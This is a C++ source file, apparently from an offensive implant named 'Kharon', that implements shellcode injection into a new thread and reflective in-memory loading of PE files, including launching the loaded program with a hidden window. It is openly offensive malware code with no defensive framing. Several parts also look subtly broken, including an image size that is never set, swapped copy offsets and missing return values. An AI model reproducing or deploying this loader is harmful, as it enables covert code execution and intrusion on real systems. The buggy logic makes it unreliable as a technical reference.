#include <Kharon.h>

auto DECLFN Injection::Shellcode(
    _In_ PBYTE Buffer,
    _In_ UPTR  Size
) -> BOOL {
    BOOL  Success = FALSE;
    PBYTE OutBuff = { 0 };
    ULONG Length  = 0;
    PVOID Param   = NULL;

    switch ( Self->Inj->Ctx.Sc.TechniqueID ) {
        case ScClassic: {
            PVOID  ScBase   = NULL;
            ULONG  TdID     = 0;
            HANDLE TdHandle = INVALID_HANDLE_VALUE;

            Success = Self->Inj->Classic( 
                Buffer, Size, Param, &ScBase, &TdHandle, &TdID, &OutBuff, &Length 
            );

            if ( !Success ) return Success;

            Self->Pkg->Int64( GLOBAL_PKG, U_PTR( ScBase ) );
            Self->Pkg->Int32( GLOBAL_PKG, TdID );
            
            if ( Self->Inj->Ctx.Spawn && OutBuff && Length ) {
                Self->Pkg->Bytes( GLOBAL_PKG, OutBuff, Length );
            }
        }
    }
}

auto DECLFN Injection::Classic(
    _In_      PBYTE   Buffer,
    _In_      UPTR    Size,
    _In_      PVOID   Param,
    _Out_     PVOID*  Base,
    _Out_     HANDLE* TdHandle,
    _Out_     PULONG  TdID,
    _Out_opt_ PBYTE*  OutBuff,
    _Out_opt_ ULONG*  OutLen
) -> BOOL {
    HANDLE PipeHandle = INVALID_HANDLE_VALUE;
    PVOID  TmpMem     = NULL;
    ULONG  OldProt    = 0;
    ULONG  BytesRead  = 0;
    ULONG  Success    = FALSE;
    ULONG  FullSize   = 0;

    if ( Self->Inj->Ctx.Pipe.b ) {
        FullSize = ( 
            Size + sizeof( Self->Inj->Ctx.Pipe.s ) + Self->Inj->Ctx.Pipe.s + 
            sizeof( Self->Inj->Ctx.Param.s ) + Self->Inj->Ctx.Param.s
        );

        TmpMem = Self->Mm->Alloc( 0, 0, FullSize, MEM_COMMIT, PAGE_READWRITE );
        // Mem::Copy( TmpMem, Buffer, Size );
        // Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size ), &Self->Inj->Ctx.Pipe.Length, sizeof( Self->Inj->Ctx.Pipe.Length ) );
        // Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size + sizeof( Self->Inj->Ctx.Pipe.Length ) ), Self->Inj->Ctx.Pipe.Name, Self->Inj->Ctx.Pipe.Length );
        // Mem::Copy( C_PTR( U_PTR( TmpMem ) + Size + sizeof( Self->Inj->Ctx.Pipe.Length ) + Self->Inj->Ctx.Pipe.Length ), &Self->Inj->Ctx.Param.Length, sizeof( Self->Inj->Ctx.Param.Length ) );
        // Mem::Copy( reinterpret_cast<char*>( TmpMem ) + Size + sizeof( Self->Inj->Ctx.Pipe.l ) + Self->Inj->Ctx.Pipe.l + sizeof(Self->Inj->Ctx.Param.Length), Self->Inj->Ctx.Param.Buffer, Self->Inj->Ctx.Param.Length );
    } else {
        FullSize = Size;
        TmpMem   = Buffer;
    }

    *Base = Self->Mm->Alloc( 0, Base, FullSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !*Base ) { Success = FALSE; return Success; }

    if ( Self->Inj->Ctx.Spawn ) {
        Success = Self->Mm->Write( 0, Base, B_PTR( TmpMem ), FullSize );
        Self->Mm->Free( 0, TmpMem, FullSize, MEM_RELEASE );
        if ( !Success ) { return Success; }
    } else {
        Mem::Copy( Base, B_PTR( TmpMem ), FullSize );
        Self->Mm->Free( 0, TmpMem, FullSize, MEM_RELEASE );
    }

    Success = Self->Mm->Protect( 0, Base, FullSize, PAGE_EXECUTE_READ, &OldProt );
    if ( !Success ) { return Success; }

    *TdHandle = Self->Td->Create( 0, Base, Param, 0, 0, TdID );
    if ( !*TdHandle ) { Success = FALSE; return Success; }

    if ( Self->Inj->Ctx.Pipe.b ) {
        PipeHandle = Self->Krnl32.CreateFileA( 
            Self->Inj->Ctx.Pipe.p, GENERIC_READ, FILE_SHARE_READ, 0, 
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 
        );
        if ( PipeHandle == INVALID_HANDLE_VALUE ) {
            return FALSE;
        }
    
        Success = Self->Krnl32.ConnectNamedPipe( PipeHandle, 0 );
    
        // Self->Krnl32.PeekNamedPipe( PipeHandle,  )

        // Self->Krnl32.ReadFile( PipeHandle, OutBuff,  )
    }



_KH_END:

    return Success;
}

// auto DECLFN Injection::Stomp(

// )

auto DECLFN Injection::Reflection(
    _In_ PBYTE  Buffer,
    _In_ ULONG  Size,
    _In_ PVOID  Param,
    _In_ PBYTE* OutBuff
) -> BOOL {
    PBYTE ImgBase = NULL;
    ULONG ImgSize = 0;
    UPTR  Delta   = 0;
    BOOL  IsDll   = FALSE;
    PWCH* Argv   = NULL;
    INT   Argc    = 0;

    PIMAGE_NT_HEADERS     Header = { 0 };
    PIMAGE_SECTION_HEADER SecHdr = { 0 };
    PIMAGE_DATA_DIRECTORY RelDir = { 0 };
    PIMAGE_DATA_DIRECTORY ImpDir = { 0 };

    Header = (PIMAGE_NT_HEADERS)( U_PTR( Buffer ) + ( (PIMAGE_DOS_HEADER)( Buffer ) )->e_lfanew );
    SecHdr = IMAGE_FIRST_SECTION( Header );
    RelDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    ImpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    IsDll = Header->FileHeader.Characteristics & IMAGE_FILE_DLL;
    Delta = Header->OptionalHeader.ImageBase;
    Size  = Header->OptionalHeader.SizeOfImage;

    ImgBase = (PBYTE)Self->Mm->Alloc( 0, NULL, ImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        Mem::Copy(
            ImgBase + SecHdr[i].PointerToRawData,
            Buffer  + SecHdr[i].VirtualAddress,
            U_PTR( Buffer  + SecHdr[i].SizeOfRawData )
        );
    }

    Self->Usf->FixImp( ImgBase, ImpDir );
    Self->Usf->FixRel( ImgBase, Delta, RelDir );

    for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
        PVOID    SectionPtr       = ( ImgBase + SecHdr[i].VirtualAddress );
        SIZE_T   SectionSize      = SecHdr[i].SizeOfRawData;;
        ULONG    MemoryProtection = 0;
        ULONG    OldProtection    = 0;
		
		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE )
			MemoryProtection = PAGE_WRITECOPY;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ )
			MemoryProtection = PAGE_READONLY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_READWRITE;

		if ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
			MemoryProtection = PAGE_EXECUTE;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			MemoryProtection = PAGE_EXECUTE_WRITECOPY;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_EXECUTE_READ;

		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
			MemoryProtection = PAGE_EXECUTE_READWRITE;

        if ( !( Self->Mm->Protect( NtCurrentProcess(), &SectionPtr, SectionSize, MemoryProtection, &OldProtection ) ) ) { return FALSE; }
    }

    if ( IsDll ) {
        BOOL ( *KDllMain )( PVOID, ULONG, PVOID ) = decltype( KDllMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
        KDllMain( ImgBase, DLL_PROCESS_ATTACH, NULL );
    } else {
        if ( Header->OptionalHeader.Subsystem == 2 ) {
            INT ( *KWinMain )( PVOID, UPTR, PVOID, INT ) = decltype( KWinMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
            KWinMain( ImgBase, Self->Session.Base.Start, Param, SW_HIDE );
        } else if ( Header->OptionalHeader.Subsystem == 3 ) {
            INT ( *KMain )( INT, PWCH* ) = decltype( KMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
            Argv = Self->Shell32.CommandLineToArgvW( W_PTR( Param ), &Argc );
            KMain( Argc, Argv );
        }
    }
}